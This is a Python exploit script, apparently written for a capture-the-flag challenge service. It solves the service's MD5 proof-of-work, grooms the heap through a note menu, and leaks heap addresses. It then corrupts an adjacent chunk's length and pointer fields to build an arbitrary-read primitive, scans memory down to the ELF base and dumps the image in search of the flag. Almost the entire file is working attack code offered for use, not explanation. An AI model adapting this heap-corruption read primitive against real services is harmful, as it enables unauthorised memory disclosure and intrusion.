#!/usr/bin/env python3
"""Step5: get binary pointer (heap_start+0x2e0), deref it, then page-scan down to ELF base."""
import hashlib, itertools, re, socket, string, sys, time, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "env.xj.edisec.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32763
p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
u64 = lambda b: struct.unpack("<Q", bytes(b[:8]).ljust(8, b"\x00"))[0]
FLAG_RE = re.compile(rb"(?:[Ff][Ll][Aa][Gg]|[A-Za-z0-9_]{2,12})\{[!-~]{3,80}\}")


def drain(s, wait=0.8, bufsize=1 << 20):
    s.settimeout(0.2); buf = b""; end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(bufsize)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]; fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


class C:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        b = drain(self.s, 1.5)
        m1 = re.search(rb"Token:\s*([A-Za-z_]+)", b); m2 = re.search(rb"MD5:\s*([0-9a-f]{32})", b)
        if not (m1 and m2):
            raise SystemExit("no pow banner: %r" % b[:120])
        ans = solve_pow(m2.group(1).decode(), m1.group(1).decode())
        print("[pow] %s -> %s" % (m1.group(1).decode(), ans), flush=True)
        self.send(ans, 1.4)

    def send(self, line, wait=0.7):
        try:
            self.s.sendall(str(line).encode() + b"\n")
        except OSError:
            return b""
        return drain(self.s, wait)

    def create(self, idx, title, reserve, length, hexdata):
        self.send(1); self.send(idx); self.send(title); self.send(reserve); self.send(length)
        return self.send(hexdata, 0.9)

    def edit(self, idx, length, hexdata, wait=0.9):
        self.send(2); self.send(idx); self.send(length); return self.send(hexdata, wait)

    def show(self, idx, wait=1.0):
        self.send(3); return self.send(idx, wait)

    def pack(self, idx):
        self.send(4); return self.send(idx)


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    return (int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())) if m else None


c = C(HOST, PORT)
c.create(0, "A", 512, 512, "41" * 512); c.pack(0)
c.create(1, "B", 32, 32, "42" * 32)
c.create(2, "C", 32, 32, "43" * 32)
c.create(3, "D", 32, 32, "44" * 32)
d = None
for _ in range(4):
    d = parse(c.show(0, wait=1.4))
    if d:
        break
A_USER = u64(d[2][0x30:0x38]) - 0x60
top = u64(d[2][0x168:0x170])
heap_start = A_USER + 0x160 + (top & ~0xf) - 0x21000
print("[heap] heap_start=0x%x A_user=0x%x" % (heap_start, A_USER), flush=True)


def arb_read(addr, n, wt=1.2):
    p = bytearray(b"\x00" * 0x38)
    p[0x18:0x20] = p64(0x41); p[0x20:0x28] = p64(n)
    p[0x28:0x30] = p64(n); p[0x30:0x38] = p64(addr)
    c.edit(0, 0x38, p.hex())
    r = c.show(1, wait=wt + n / 8000.0)
    dd = parse(r)
    return dd[2][:n] if (dd and len(dd[2]) >= n) else None


# binary pointer lives at fixed heap offset 0x2e0
st = arb_read(heap_start + 0x2e0, 0x20)
print("[startup 0x2e0..]", st.hex() if st else None, flush=True)
bptr = u64(st[0:8]) if st else 0
print("[bptr] 0x%x  (off page=0x%x)" % (bptr, bptr & 0xfff), flush=True)

if bptr:
    m = arb_read(bptr, 0x40)
    print("[deref bptr] %s  runs=%r" % (m.hex() if m else None,
                                        re.findall(rb"[ -~]{4,}", m)[:6] if m else None), flush=True)

    # page-scan downward to ELF base
    pg = bptr & ~0xfff
    print("[scan] down from 0x%x ..." % pg, flush=True)
    base = None
    for k in range(0x400):
        addr = pg - k * 0x1000
        b = arb_read(addr, 16, wt=0.8)
        if b is None:
            print("  [scan] READ FAIL @0x%x (unmapped?) - stopping" % addr, flush=True)
            break
        if b[:4] == b"\x7fELF":
            base = addr
            print("  [scan] ELF BASE @0x%x" % addr, flush=True)
            break
        if k % 16 == 0:
            print("  [scan] 0x%x : %s" % (addr, b.hex()), flush=True)
    print("[base] %s" % (hex(base) if base else "NOT FOUND"), flush=True)

    if base:
        # dump .rodata/.data/.bss region broadly for flag
        img = b""
        for off in range(0, 0x30000, 0x2000):
            b = arb_read(base + off, 0x2000, wt=1.5)
            if b is None:
                print("[img] stop @+0x%x" % off, flush=True); break
            img += b
        print("[img] %d bytes" % len(img), flush=True)
        for mm in FLAG_RE.finditer(img):
            print("  !!! FLAG @+0x%x: %s" % (mm.start(), mm.group(0).decode()), flush=True)
        for mm in re.finditer(rb"[ -~]{6,}", img):
            s = mm.group(0)
            if b"flag" in s.lower() or b"FLAG" in s:
                print("  str @+0x%x: %r" % (mm.start(), s[:80]), flush=True)
c.s.close()